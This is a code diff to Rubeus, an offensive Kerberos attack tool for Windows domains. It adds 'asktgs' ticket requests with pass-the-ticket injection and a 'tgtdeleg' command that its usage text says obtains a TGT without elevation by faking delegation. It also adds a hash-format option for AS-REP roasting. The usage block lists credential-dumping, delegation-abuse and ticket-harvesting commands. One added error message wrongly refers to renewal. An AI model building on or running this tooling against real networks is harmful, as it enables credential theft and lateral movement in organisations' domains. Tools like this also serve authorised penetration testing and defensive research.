@@ -18,7 +18,7 @@ namespace Rubeus
             System.Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
             System.Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
             System.Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
-            System.Console.WriteLine("  v1.0.0\r\n");
+            System.Console.WriteLine("  v1.1.0\r\n");
         }
 
         public static void Usage()
@@ -28,8 +28,10 @@ namespace Rubeus
             Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]");
             Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, start a /netonly process, and to apply the ticket to the new process/logon session:");
             Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");
-            Console.WriteLine("\r\n    Renew a TGT, optionally appling the ticket or auto-renewing the ticket up to its renew-till limit:");
+            Console.WriteLine("\r\n    Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:");
             Console.WriteLine("        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]");
+            Console.WriteLine("\r\n    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:");
+            Console.WriteLine("        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]");
             Console.WriteLine("\r\n    Perform S4U constrained delegation abuse:");
             Console.WriteLine("        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
             Console.WriteLine("        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
@@ -49,6 +51,8 @@ namespace Rubeus
             Console.WriteLine("        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");
             Console.WriteLine("\r\n    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:");
             Console.WriteLine("        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]");
+            Console.WriteLine("\r\n    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:");
+            Console.WriteLine("        Rubeus.exe tgtdeleg [/target:SPN]");
             Console.WriteLine("\r\n    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:");
             Console.WriteLine("        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]");
             Console.WriteLine("\r\n    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:");
@@ -176,6 +180,63 @@ namespace Rubeus
                 else
                 {
                     Ask.TGT(user, domain, hash, encType, ptt, dc, luid);
+                    return;
+                }
+            }
+
+            if (arguments.ContainsKey("asktgs"))
+            {
+                bool ptt = false;
+                string dc = "";
+                string service = "";
+
+                if (arguments.ContainsKey("/ptt"))
+                {
+                    ptt = true;
+                }
+
+                if (arguments.ContainsKey("/dc"))
+                {
+                    dc = arguments["/dc"];
+                }
+
+                if (arguments.ContainsKey("/service"))
+                {
+                    service = arguments["/service"];
+                }
+                else
+                {
+                    Console.WriteLine("[X] One or more '/service:sname/server.domain.com' specifications are needed");
+                    return;
+                }
+
+                if (arguments.ContainsKey("/ticket"))
+                {
+                    string kirbi64 = arguments["/ticket"];
+
+                    if (Helpers.IsBase64String(kirbi64))
+                    {
+                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
+                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                        Ask.TGS(kirbi, service, ptt, dc, true);
+                        return;
+                    }
+                    else if (File.Exists(kirbi64))
+                    {
+                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
+                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                        Ask.TGS(kirbi, service, ptt, dc, true);
+                        return;
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
+                    }
+                    return;
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for renewal!\r\n");
                     return;
                 }
             }
@@ -481,6 +542,7 @@ namespace Rubeus
                 string user = "";
                 string domain = "";
                 string dc = "";
+                string format = "john";
 
                 if (arguments.ContainsKey("/user"))
                 {
@@ -494,6 +556,11 @@ namespace Rubeus
                 {
                     dc = arguments["/dc"];
                 }
+                if (arguments.ContainsKey("/format"))
+                {
+                    format = arguments["/format"];
+                }
+
 
                 if (String.IsNullOrEmpty(user))
                 {
@@ -507,11 +574,11 @@ namespace Rubeus
 
                 if (String.IsNullOrEmpty(dc))
                 {
-                    Roast.ASRepRoast(user, domain);
+                    Roast.ASRepRoast(user, domain, "", format);
                 }
                 else
                 {
-                    Roast.ASRepRoast(user, domain, dc);
+                    Roast.ASRepRoast(user, domain, dc, format);
                 }
             }
 
@@ -550,6 +617,18 @@ namespace Rubeus
                 else
                 {
                     LSA.ListKerberosTicketData();
+                }
+            }
+
+            else if (arguments.ContainsKey("tgtdeleg"))
+            {
+                if (arguments.ContainsKey("/target"))
+                {
+                    LSA.RequestFakeDelegTicket(arguments["/target"]);
+                }
+                else
+                {
+                    LSA.RequestFakeDelegTicket();
                 }
             }
 
